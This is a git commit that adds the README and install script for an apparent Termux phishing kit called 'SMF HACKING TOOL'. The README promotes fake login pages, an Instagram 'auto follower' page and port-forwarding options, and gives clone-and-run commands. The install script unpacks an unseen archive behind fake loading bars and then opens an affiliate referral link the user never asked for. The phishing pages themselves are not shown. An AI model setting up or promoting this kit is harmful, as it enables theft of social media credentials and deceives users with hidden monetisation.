25135e576828614dca8054f3d074a504852fc88e
Abhishek Balaskar <112996657+CyberTech-Abhi20@users.noreply.github.com>
2022-09-23 11:57:23 +0530

    Add files via upload

---
+++ SMF-main/SMF-main/README.md
@@ -0,0 +1,37 @@
+
+
+
+
+# Pavan-123-tech
+[![20200703_192925.png](https://img.imageupload.net/2020/07/03/20200703_192925.png)]
+
+# SMF HACKING TOOL 
+[![IMG_20200624_014109.md.jpg](https://imagehost.imageupload.net/2020/06/24/IMG_20200624_014109.md.jpg)](https://www.imageupload.net/image/9pFIc)
+
+## Installation Commands ↙️
+* `apt update`
+* `apt upgrade`
+* `pkg install git`
+* `git clone https://github.com/Pavan-123-tech/SMF.git`
+* `cd SMF`
+* `bash install.sh`
+* `bash smf.sh`
+
+
+### <<< If you copy , Then Give me The Credits >>>
+
+## Features :
+#### [+] Latest Login Pages !
+#### [+] New Instagram Auto Follower Page !
+#### [+] 4 Port Forwarding Options !
+#### [+] Easy for Beginners !
+
+
+
+## Find Me on :
+[![Github](https://github.com/Pavan-123-tech/)]
+
+[!Instagram](https://www.instagram.com/mr.pawanraut_99/)]
+
+
+
---
+++ SMF-main/SMF-main/install.sh
@@ -0,0 +1,55 @@
+#!/bin/bash
+#code_recorded_by_tech_cochi
+clear
+sleep 1
+echo ""
+echo ""
+echo " 
+████████╗███████╗░█████╗░██╗░░██╗
+╚══██╔══╝██╔════╝██╔══██╗██║░░██║
+░░░██║░░░█████╗░░██║░░╚═╝███████║
+░░░██║░░░██╔══╝░░██║░░██╗██╔══██║
+░░░██║░░░███████╗╚█████╔╝██║░░██║
+░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝ " | lolcat
+
+
+
+
+echo ""
+sleep 1
+clear
+
+pkg install php -y
+pkg install openssh -y
+pkg install unzip -y
+pkg install curl -y
+sleep 1
+clear
+
+echo "Loading==> " | lolcat
+sleep 1
+clear
+echo "Loading====> " | lolcat
+sleep 1
+clear
+echo "Loading=======> " | lolcat
+sleep 1
+clear
+echo " done " | lolcat
+sleep 1
+clear
+unzip techcochi.zip
+clear
+rm -rf techcochi.zip
+clear
+bash about.sh
+sleep 4
+echo ""
+echo ""
+
+echo ""
+sleep 10
+echo " create account on cashkaro.com "
+echo " set your browser "
+termux-open-url https://cashkaro.com?r=8026255&fname=Rixon
+echo ""
